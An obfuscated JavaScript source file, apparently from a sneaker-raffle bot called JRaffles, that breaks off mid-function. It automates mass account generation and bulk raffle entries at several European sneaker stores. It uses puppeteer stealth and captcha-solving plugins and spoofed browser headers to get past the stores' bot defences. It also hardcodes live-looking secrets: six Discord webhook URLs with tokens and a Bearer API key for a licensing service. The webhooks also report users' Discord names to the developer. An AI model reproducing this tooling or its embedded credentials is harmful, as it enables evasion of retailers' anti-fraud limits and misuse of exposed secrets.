const { EmbedBuilder: _0x2b40cb } = require('discord.js');
var _0x4a6bf3 = require('exe');
const { execFile: _0x3c7689 } = require('child_process'), _0x4ec495 = require('puppeteer-extra'), _0x480aae = require('puppeteer-extra-plugin-recaptcha'), _0x21618b = require('puppeteer-extra-plugin-stealth'), _0x108b38 = require('chalk'), _0x4204b1 = require('node-bash-title'), _0x3fdbd7 = require('fs'), _0x13d3d4 = require('axios'), _0x475fe8 = require('papaparse');
var _0xdae2db = require('random-name');
const _0x306f3e = require('request');
var _0x3c06d4 = require('prompt');
const _0x45c692 = _0x306f3e['jar']();
var _0x4c3205 = {};
const _0x566d07 = '1067398661929181186/wvxr1d4nwFDFE-hAKBisU_mVWLloqatitfWvCqqIv38EUYiJMm_Pr3VKsuLsUBKN3PPj', _0x112b78 = '1067398856721051719/2gS-h641y_RoqR-KZ5aOcrnDfvvXNQIz4uQv8eA8A5_nsRSJlaCaStreLwCu5lmUjO4H', _0x55fa58 = '1068515411877957743/t_TXlLhYbeQmPL19hyGeNqi1G0KPT8KCBYOVOcryGMvXPfIUBEpNZRBCC1j7OFRej4A6', _0x293510 = '1068519704525807616/luGgvM1ZbR7g1zM5-10y5yceL2OGVCjrlkB6XxQL-hdoHUJ6hwSVAn6vVNyieHWLqPHE', _0x596cad = '1070657276525940746/GSfXwIxjuRjwmP3sTDw73M4V2P5OJqMFgZyECtpBwFmtXGINvj1xFsVsZ2KwGBpJNHpn', _0x58061d = '1072865476457287711/EePVQu0bb06IdHG3FfG7M-JDaE-38prupCPoCqaduP6mG_tsshUSaKidyfyVx0YgNC7e';
var _0x5c196a = 'https://discord.com/api/webhooks/', _0x5052e4 = '' + _0x5c196a + _0x55fa58, _0x2055ba = '' + _0x5c196a + _0x293510, _0x45c891 = '' + _0x5c196a + _0x566d07, _0x40d0b0 = '' + _0x5c196a + _0x112b78, _0x5ca215 = '' + _0x5c196a + _0x596cad, _0x2d16bc = '' + _0x5c196a + _0x58061d;
const _0x10b3e7 = JSON['parse'](_0x3fdbd7['readFileSync']('../package.json', 'utf-8')), _0x4351c2 = _0x10b3e7['version'];
var _0x4a41d1, _0x36f446, _0x29988e, _0x5dafd3, _0x144a43, _0x1d3ec3, _0x4ca7a9, _0x178f5c;
const _0x493656 = 'pk_7R7rRwMpveiR8OufEx9xIDMdU8Y95GgvGLF59wWRqklMwhXdpDnh5sN2KfaPHjEe';
let _0x5e1d73 = ![];
const _0x341bde = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', _0x150786 = '0123456789';
var _0x564ac6 = _0x341bde['split']('');
const _0x738b9 = require('auto-git-update'), { PageEmittedEvents: _0x50fec6 } = require('puppeteer'), { getRandomValues: _0x347c29 } = require('crypto'), { resolve: _0x1e8b51 } = require('path'), { Console: _0x1effd9 } = require('console'), _0x1bb9de = {
    'repository': 'https://github.com/Jarno97/JRafflesBot',
    'branch': 'main',
    'fromReleases': ![],
    'tempLocation': 'C:/temp/jraffles',
    'ignoreFiles': [
        'settings.json',
        'proxies.txt',
        'tasks/maha.csv',
        'tasks/footshop.csv',
        'tasks/afew.csv',
        'tasks/oqium.csv',
        'tasks/patta.csv',
        'accounts/patta.csv',
        'tasks/kickz.csv',
        'accounts/kickz-verified.csv',
        'accounts/kickz-unverified.csv'
    ]
}, _0x2ea972 = new _0x738b9(_0x1bb9de);
async function _0x1fc110() {
    _0x144a43 = _0x3fdbd7['readdirSync']('../proxies'), _0x5dafd3 = _0x3fdbd7['readdirSync']('../tasks'), !_0x3fdbd7['existsSync']('../accounts/fenom.csv') && _0x3fdbd7['writeFileSync']('../accounts/fenom.csv', 'Email,Password\x0a'), !_0x3fdbd7['existsSync']('../accounts/bstn.csv') && _0x3fdbd7['writeFileSync']('../accounts/bstn.csv', 'Email,Password\x0a'), !_0x3fdbd7['existsSync']('../failed-tasks.csv') && _0x3fdbd7['writeFileSync']('../failed-tasks.csv', 'Time,Store,Mode,Url,Size,Follower,FirstName,LastName,Address1,Address2,HouseNumber,Zip,City,State,Country,Phone,Email,Password,PaymentMethod,CardType,NameOnCard,CardNumber,ExpiryDate,CVV,IsBillingSame,BillingFirstName,BillingLastName,BillingAddress1,BillingAddress2,BillingHouseNumber,BillingZip,BillingCity,BillingState,BillingCountry,BillingPhone\x0a'), !_0x3fdbd7['existsSync']('../successful-tasks.csv') && _0x3fdbd7['writeFileSync']('../successful-tasks.csv', 'Time,Store,Mode,Url,Size,Follower,FirstName,LastName,Address1,Address2,HouseNumber,Zip,City,State,Country,Phone,Email,Password,PaymentMethod,CardType,NameOnCard,CardNumber,ExpiryDate,CVV,IsBillingSame,BillingFirstName,BillingLastName,BillingAddress1,BillingAddress2,BillingHouseNumber,BillingZip,BillingCity,BillingState,BillingCountry,BillingPhone\x0a'), _0x4c3205 = JSON['parse'](_0x3fdbd7['readFileSync']('../settings.json', 'utf-8')), !_0x4c3205['delay'] && (_0x4c3205['delay'] = 0x2710, _0x3fdbd7['writeFileSync']('../settings.json', JSON['stringify'](_0x4c3205))), !_0x4c3205['captchaKey'] && (_0x4c3205['captchaKey'] = '', _0x3fdbd7['writeFileSync']('../settings.json', JSON['stringify'](_0x4c3205))), !_0x4c3205['useRandomProxy'] && (_0x4c3205['useRandomProxy'] = !![], _0x3fdbd7['writeFileSync']('../settings.json', JSON['stringify'](_0x4c3205))), !_0x4c3205['webhook'] && (_0x4c3205['webhook'] = '', _0x3fdbd7['writeFileSync']('../settings.json', JSON['stringify'](_0x4c3205))), _0x4c3205['MahaDelay'] = _0x4c3205['delay'], _0x5c196a = _0x4c3205['webhook'], _0x1d3ec3 = _0x4c3205['licenseKey'];
}
let _0x4f5d2c, _0x531a02 = [], _0x10991a;
const _0x4e5841 = _0x1d40d2 => new Promise(_0x2bdbc4 => setTimeout(_0x2bdbc4, _0x1d40d2));
function _0x3b3e48(_0x54ba73, _0x37125a) {
    return Math['floor'](Math['random']() * (_0x37125a - _0x54ba73 + 0x1) + _0x54ba73);
}
async function _0x303d3b(_0x6f3bae) {
    return _0x13d3d4['get']('https://api.hyper.co/v4/licenses/' + _0x6f3bae, { 'headers': { 'Authorization': 'Bearer\x20' + _0x493656 } })['then'](_0x325bfe => _0x325bfe['data'])['catch'](() => null);
}
;
async function _0x51b64d(_0x5981fb) {
    console['clear']();
    if (_0x5981fb == 'AWGH-0N92-JE6S-HOHU') {
        console['log']('Please\x20paste\x20your\x20key\x20here:');
        var _0x22deb2 = await _0x3c06d4['get']('License');
        if (_0x22deb2['License'] == 'AWGH-0N92-JE6S-HOHU')
            return console['log']('Error\x20please\x20use\x20the\x20key\x20on\x20the\x20JRaffles\x20dashboard'), await _0x4e5841(0xbb8), _0x51b64d(_0x5981fb);
        _0x5981fb = _0x22deb2['License'], _0x4c3205['licenseKey'] = _0x5981fb, _0x1d3ec3 = _0x5981fb, _0x3fdbd7['writeFileSync']('../settings.json', JSON['stringify'](_0x4c3205));
    }
    console['log']('Checking\x20license\x20' + _0x1d3ec3 + '...'), await _0x4e5841(0x320);
    const _0x2d87bd = await _0x303d3b(_0x5981fb);
    _0x4ca7a9 = JSON['stringify'](_0x2d87bd['user']['discord']['username'])['substring'](0x1)['slice'](0x0, -0x1), _0x178f5c = JSON['stringify'](_0x2d87bd['user']['discord']['avatar'])['substring'](0x1)['slice'](0x0, -0x1);
    if (!_0x2d87bd)
        return console['log']('License\x20not\x20found');
    if (!_0x2d87bd['user'])
        return console['log']('License\x20not\x20bound');
    return _0x2d87bd['status'] === 'active' ? (console['log']('License\x20is\x20good\x20to\x20go!'), _0x5e1d73 = !![]) : (console['log']('Could\x20not\x20find\x20license..'), _0x5e1d73 = ![]);
}
async function _0x5e9074() {
    var _0x174101 = await _0x3c06d4['get']('Module');
    return console['clear'](), _0x174101['Module'];
}
;
async function _0x3dd033() {
    var _0x30fd1c = await _0x3c06d4['get']('Setting');
    return console['clear'](), _0x30fd1c['Setting'];
}
async function _0x239535() {
    console['clear'](), console['log']('Choose\x20A\x20File\x20to\x20Run\x20\x0a');
    for (var _0x5b57b9 = 0x0; _0x5b57b9 < _0x5dafd3['length']; _0x5b57b9++) {
        console['log']('\x20(' + _0x5b57b9 + ')\x20' + _0x5dafd3[_0x5b57b9]);
    }
    console['log']('');
    var _0x2c505a = await _0x3c06d4['get']('Task');
    if (_0x2c505a['Task'] > _0x5dafd3['length'] - 0x1 || isNaN(_0x2c505a['Task']) == !![])
        return console['log']('Invalid\x20selection'), await _0x4e5841(0x3e8), _0x239535();
    var _0x1e45bc = _0x3fdbd7['readFileSync']('../tasks/' + _0x5dafd3[_0x2c505a['Task']], 'utf-8');
    return _0x29988e = _0x475fe8['parse'](_0x1e45bc, { 'header': !![] })['data'], console['clear'](), console['log']('Running\x20' + _0x108b38['blue'](_0x5dafd3[_0x2c505a['Task']])), _0x4a41d1 = _0x5dafd3[_0x2c505a['Task']], _0x29988e;
}
async function _0x286f71() {
    console['clear'](), console['log']('Choose\x20Proxies\x20to\x20Use\x20\x0a');
    for (var _0x5a33ff = 0x0; _0x5a33ff < _0x144a43['length']; _0x5a33ff++) {
        console['log']('\x20(' + _0x5a33ff + ')\x20' + _0x144a43[_0x5a33ff]);
    }
    console['log']('');
    var _0x206be6 = await _0x3c06d4['get']('Proxies');
    if (_0x206be6['Proxies'] > _0x144a43['length'] - 0x1 || isNaN(_0x206be6['Proxies']) == !![])
        return console['log']('Invalid\x20selection'), await _0x4e5841(0x3e8), _0x286f71();
    var _0xa03730 = _0x3fdbd7['readFileSync']('../proxies/' + _0x144a43[_0x206be6['Proxies']], 'utf-8')['split']('\x0a');
    let _0x4beaf7 = _0xa03730['map']((_0x10a0a3, _0x1b4a02) => {
        sanatizeProxy = _0x10a0a3['replace']('\x0d', '');
        if (_0xa03730[_0x1b4a02 + 0x1] != undefined)
            return '' + sanatizeProxy;
        return '' + sanatizeProxy;
    });
    return _0x36f446 = _0x144a43[_0x206be6['Proxies']], console['clear'](), _0x4beaf7;
}
async function _0x14c07d() {
    var _0x195d6b = await _0x3c06d4['get']('Value');
    return console['clear'](), _0x195d6b['Value'];
}
async function _0x190ee0(_0x59e309) {
    console['clear'](), console['log']('What\x20would\x20you\x20like\x20to\x20do?\x20\x0a');
    for (var _0x35a5d0 = 0x0; _0x35a5d0 < _0x59e309['length']; _0x35a5d0++) {
        console['log']('\x20(' + _0x35a5d0 + ')\x20[' + _0x59e309[_0x35a5d0]['name'] + ']');
    }
    ;
    console['log']('');
    var _0x18a503 = await _0x3c06d4['get']('Module');
    return _0x18a503['Module'];
}
async function _0x3dd1cf() {
    var _0x5515b8 = await _0x3c06d4['get']('Password');
    return console['clear'](), _0x5515b8['Password'];
}
;
async function _0x148442() {
    var _0x196199 = await _0x3c06d4['get']('Links');
    return _0x196199['Links'];
}
;
async function _0x5f08f4() {
    console['log']('Choose\x20a\x20Raffle\x20to\x20enter:\x20\x0a');
    for (var _0x187197 = 0x0; _0x187197 < _0x531a02['length']; _0x187197++) {
        console['log']('\x20(' + _0x187197 + ')\x20' + _0x531a02[_0x187197]);
    }
    ;
    console['log']();
    let _0x312da1 = await _0x3c06d4['get']('Product');
    return console['clear'](), _0x312da1['Product'];
}
;
function _0x21f008() {
    var _0x248db8 = new Date(Date['now']())['toLocaleTimeString']();
    return _0x248db8;
}
;
function _0x55e366() {
    var _0x3b5410 = new Date(Date['now']())['toLocaleString']();
    return _0x3b5410['replace'](',', '');
}
const _0x3962b3 = [
    {
        'name': 'AFEW\x20Store',
        'modules': [{
            'name': 'AFEW\x20Raffle\x20Entries',
            'store': 'AFEW',
            'logo': 'https://d19kzigy6tpscu.cloudfront.net/media/CACHE/images/logo_thumbnail/afew_logo_100x100_1647428869.png'
        }]
    },
    {
        'name': 'BSTN',
        'modules': [
            {
                'name': 'BSTN\x20Account\x20Generator',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png'
            },
            {
                'name': 'BSTN\x20Account\x20Verifier',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png'
            },
            {
                'name': 'BSTN\x20Raffle\x20Entries',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png'
            }
        ]
    },
    {
        'name': 'FENOM',
        'modules': [
            {
                'name': 'FENOM\x20Account\x20Generator',
                'store': 'FENOM',
                'logo': 'https://consumersiteimages.trustpilot.net/business-units/5de8db15496f380001d51371-198x149-1x.jpg'
            },
            {
                'name': 'FENOM\x20Raffle\x20Entries',
                'store': 'FENOM',
                'logo': 'https://consumersiteimages.trustpilot.net/business-units/5de8db15496f380001d51371-198x149-1x.jpg'
            }
        ]
    },
    {
        'name': 'FOOTSHOP',
        'modules': [{
            'name': 'FOOTSHOP\x20Raffle\x20Entries',
            'store': 'Footshop',
            'logo': 'https://images.easyfundraising.org.uk/retailer/cropped/logo-footshop-1615542072.png'
        }]
    },
    {
        'name': 'JD',
        'modules': [{
            'name': 'JD\x20Raffle\x20Entries',
            'store': 'JD',
            'logo': 'https://upload.wikimedia.org/wikipedia/en/thumb/d/d8/JD_Sports_logo.svg/2048px-JD_Sports_logo.svg.png'
        }]
    },
    {
        'name': 'KICKZ',
        'modules': [
            {
                'name': 'KICKZ\x20Account\x20Generator',
                'store': 'KICKZ',
                'logo': 'https://scontent-ams2-1.cdninstagram.com/v/t51.2885-19/240479500_928777121004310_8721482303708952556_n.jpg?stp=dst-jpg_s320x320&_nc_ht=scontent-ams2-1.cdninstagram.com&_nc_cat=1&_nc_ohc=9H1DnW3bwMAAX-W7Mo2&edm=AOQ1c0wBAAAA&ccb=7-5&oh=00_AfDjR8EqgPUyl8iQgx56K_94mx_vSIRsFkQbyEq02-zAUQ&oe=63E0E147&_nc_sid=8fd12b'
            },
            {
                'name': 'KICKZ\x20Raffle\x20Entries',
                'store': 'KICKZ',
                'logo': 'https://scontent-ams2-1.cdninstagram.com/v/t51.2885-19/240479500_928777121004310_8721482303708952556_n.jpg?stp=dst-jpg_s320x320&_nc_ht=scontent-ams2-1.cdninstagram.com&_nc_cat=1&_nc_ohc=9H1DnW3bwMAAX-W7Mo2&edm=AOQ1c0wBAAAA&ccb=7-5&oh=00_AfDjR8EqgPUyl8iQgx56K_94mx_vSIRsFkQbyEq02-zAUQ&oe=63E0E147&_nc_sid=8fd12b'
            }
        ]
    },
    {
        'name': 'MAHA\x20Amsterdam',
        'modules': [
            {
                'name': 'MAHA\x20Raffle\x20Entries',
                'store': 'MAHA',
                'logo': 'https://i1.sndcdn.com/avatars-XIAMNs5LPWV2iRwj-SNwa5A-t500x500.jpg',
                'url': 'https://a.klaviyo.com/client/subscriptions/?company_id=THxSew',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'RvxrAV',
                            'custom_source': 'Air\x20Jordan\x201\x20High\x20OG\x20\x27White\x20Cement\x27',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'WQN5XR',
                                '$consent_form_version': 0x7f7254,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                }
            },
            {
                'name': 'MAHA\x20Raffle\x20Verification',
                'store': 'MAHA',
                'logo': 'https://i1.sndcdn.com/avatars-XIAMNs5LPWV2iRwj-SNwa5A-t500x500.jpg',
                'url': '',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'TFTWYv',
                            'custom_source': 'Air\x20Jordan\x201\x20Retro\x20High\x20OG\x20Lost\x20and\x20Found',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'V4PNGA',
                                '$consent_form_version': 0x6fd46d,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                }
            }
        ]
    },
    {
        'name': 'OQIUM\x20Store',
        'modules': [
            {
                'name': 'OQIUM\x20Raffle\x20Entries',
                'store': 'OQIUM',
                'logo': 'https://s3-eu-west-1.amazonaws.com/tpd/logos/5e8e742e8f9bb4000118f0bc/0x0.png',
                'url': 'https://a.klaviyo.com/client/subscriptions/?company_id=R3sbqs',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'SQ43yf',
                            'custom_source': 'DZ5485-052',
                            'email': '',
                            'properties': {
                                '$first_name': '',
                                '$last_name': '',
                                '$phone_number': '',
                                'Size': '',
                                'Instagram\x20Account': '',
                                '$address1': '',
                                '$zip': '',
                                '$city': '',
                                '$country': '',
                                'Accepts\x20Marketing': ['NoByRaffle'],
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'WLQk7t',
                                '$consent_form_version': 0x7f71d6,
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://oqium.com',
                    'referer': 'https://oqium.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                }
            },
            {
                'name': 'OQIUM\x20Raffle\x20Verification',
                'url': '',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'TFTWYv',
                            'custom_source': 'Air\x20Jordan\x201\x20Retro\x20High\x20OG\x20Lost\x20and\x20Found',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'V4PNGA',
                                '$consent_form_version': 0x6fd46d,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                }
            }
        ]
    },
    {
        'name': 'PATTA',
        'modules': [
            {
                'name': 'PATTA\x20Account\x20Generator',
                'store': 'Patta',
                'logo': 'https://cdn.shopify.com/s/files/1/0473/6965/0340/collections/patta_42f8af38-44b4-4c1b-a6f3-ec368a7b6f58_1200x1200.jpg?v=1665406562'
            },
            {
                'name': 'PATTA\x20Raffle\x20Entries',
                'store': 'Patta',
                'logo': 'https://cdn.shopify.com/s/files/1/0473/6965/0340/collections/patta_42f8af38-44b4-4c1b-a6f3-ec368a7b6f58_1200x1200.jpg?v=1665406562'
            }
        ]
    },
    {
        'name': 'SLAM\x20JAM',
        'modules': [
            {
                'name': 'SLAM\x20JAM\x20Account\x20Generator',
                'store': 'SLAM\x20JAM',
                'logo': 'https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,f_auto,q_auto:eco,dpr_1/2c778bc022405e206505'
            },
            {
                'name': 'SLAM\x20JAM\x20Raffle\x20Entries',
                'store': 'SLAM\x20JAM',
                'logo': 'https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,f_auto,q_auto:eco,dpr_1/2c778bc022405e206505'
            }
        ]
    },
    { 'name': 'Paypal\x20Verification' },
    { 'name': 'Change\x20Settings' },
    { 'name': 'Reload\x20Settings' }
];
async function _0x331f59(_0x5d6492, _0x173ce9) {
    let _0x4dcf64 = { 'headers': { 'content-type': 'application/json' } };
    if (_0x4351c2 != 'devkey') {
        await _0x13d3d4['post'](_0x5d6492, _0x173ce9, _0x4dcf64);
        return;
    }
    return console['log']('devkey\x20settings\x20enabled,\x20not\x20sending\x20webhooks');
}
;
async function _0x5b798c(_0x1e114e, _0x27fc20, _0x19110d, _0x5c1cfe, _0x1c27ab) {
    if (!_0x5c1cfe && _0x19110d == 'dev') {
        var _0x57e698 = new _0x2b40cb()['setColor'](0xc0d6d6)['setTitle']('Successful\x20Raffle\x20Entry')['setAuthor']({
            'name': 'JRaffles',
            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
            'url': 'https://twitter.com/JRaffles_'
        })['setThumbnail'](_0x27fc20['logo'])['addFields']({
            'name': 'Store',
            'value': '' + _0x27fc20['store'],
            'inline': !![]
        })['addFields']({
            'name': 'Size',
            'value': '' + _0x1e114e['Size'],
            'inline': !![]
        })['addFields']({
            'name': 'Delay',
            'value': '' + _0x4c3205['delay'],
            'inline': !![]
        })['addFields']({
            'name': 'User',
            'value': '' + _0x4ca7a9,
            'inline': !![]
        })['addFields']({
            'name': 'URL',
            'value': '' + _0x1e114e['Url'],
            'inline': !![]
        })['setTimestamp']()['setFooter']({
            'text': 'JRaffles\x20v' + _0x4351c2,
            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
        });
        return _0x57e698['data'];
    } else {
        if (_0x5c1cfe && _0x19110d == 'dev') {
            var _0x57e698 = new _0x2b40cb()['setColor'](0xc0d6d6)['setTitle']('Failed\x20Raffle\x20Entry')['setAuthor']({
                'name': 'JRaffles',
                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                'url': 'https://twitter.com/JRaffles_'
            })['setThumbnail'](_0x27fc20['logo'])['addFields']({
                'name': 'User',
                'value': '' + _0x4ca7a9,
                'inline': !![]
            }, {
                'name': 'Store',
                'value': '' + _0x27fc20['store'],
                'inline': !![]
            }, {
                'name': 'Size',
                'value': '' + _0x1e114e['Size'],
                'inline': !![]
            }, {
                'name': 'Delay',
                'value': '' + _0x4c3205['delay'],
                'inline': !![]
            })['addFields']({
                'name': 'ERROR',
                'value': '' + _0x1c27ab,
                'inline': !![]
            })['addFields']({
                'name': 'URL',
                'value': '' + _0x1e114e['Url']
            })['setTimestamp']()['setFooter']({
                'text': 'JRaffles\x20v' + _0x4351c2,
                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
            });
            return _0x57e698['data'];
        } else {
            if (_0x19110d == 'pub') {
                var _0x57e698 = new _0x2b40cb()['setColor'](0xc0d6d6)['setTitle']('Succesful\x20Raffle\x20Entry')['setAuthor']({
                    'name': 'JRaffles',
                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                    'url': 'https://twitter.com/JRaffles_'
                })['setThumbnail'](_0x27fc20['logo'])['addFields']({
                    'name': 'Store',
                    'value': '' + _0x27fc20['store'],
                    'inline': !![]
                }, {
                    'name': 'Size',
                    'value': '' + _0x1e114e['Size'],
                    'inline': !![]
                }, {
                    'name': 'Delay',
                    'value': '' + _0x4c3205['delay'],
                    'inline': !![]
                })['addFields']({
                    'name': 'URL',
                    'value': '||' + _0x1e114e['Url'] + '||'
                })['setTimestamp']()['setFooter']({
                    'text': 'JRaffles\x20v' + _0x4351c2,
                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                });
                return _0x57e698['data'];
            } else {
                if (_0x19110d == 'acc' && !_0x5c1cfe) {
                    var _0x57e698 = new _0x2b40cb()['setColor'](0xc0d6d6)['setTitle']('Account\x20Generated')['setAuthor']({
                        'name': 'JRaffles',
                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                        'url': 'https://twitter.com/JRaffles_'
                    })['setThumbnail'](_0x27fc20['logo'])['addFields']({
                        'name': 'User',
                        'value': '' + _0x4ca7a9,
                        'inline': !![]
                    }, {
                        'name': 'Store',
                        'value': '' + _0x27fc20['store'],
                        'inline': !![]
                    }, {
                        'name': 'Delay',
                        'value': '' + _0x4c3205['delay'],
                        'inline': !![]
                    })['setTimestamp']()['setFooter']({
                        'text': 'JRaffles\x20v' + _0x4351c2,
                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                    });
                    return _0x57e698['data'];
                } else {
                    if (_0x19110d == 'acc' && _0x5c1cfe) {
                        var _0x57e698 = new _0x2b40cb()['setColor'](0xc0d6d6)['setTitle']('Account\x20Generation\x20Failed')['setAuthor']({
                            'name': 'JRaffles',
                            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                            'url': 'https://twitter.com/JRaffles_'
                        })['setThumbnail'](_0x27fc20['logo'])['addFields']({
                            'name': 'User',
                            'value': '' + _0x4ca7a9,
                            'inline': !![]
                        }, {
                            'name': 'Error',
                            'value': '' + _0x1c27ab,
                            'inline': !![]
                        }, {
                            'name': 'Store',
                            'value': '' + _0x27fc20['store'],
                            'inline': !![]
                        }, {
                            'name': 'Delay',
                            'value': '' + _0x4c3205['delay'],
                            'inline': !![]
                        })['setTimestamp']()['setFooter']({
                            'text': 'JRaffles\x20v' + _0x4351c2,
                            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                        });
                        return _0x57e698['data'];
                    } else {
                        if (_0x19110d == 'open') {
                            var _0x57e698 = new _0x2b40cb()['setColor'](0xc0d6d6)['setTitle']('User\x20Opened\x20JRaffles')['setAuthor']({
                                'name': 'JRaffles',
                                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                'url': 'https://twitter.com/JRaffles_'
                            })['setThumbnail'](_0x178f5c)['addFields']({
                                'name': 'User',
                                'value': '' + _0x4ca7a9,
                                'inline': !![]
                            })['setTimestamp']()['setFooter']({
                                'text': 'JRaffles\x20v' + _0x4351c2,
                                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                            });
                            return _0x57e698['data'];
                        } else {
                            if (!_0x5c1cfe && _0x19110d == 'ver') {
                                var _0x57e698 = new _0x2b40cb()['setColor'](0xc0d6d6)['setTitle']('Successful\x20Verification')['setAuthor']({
                                    'name': 'JRaffles',
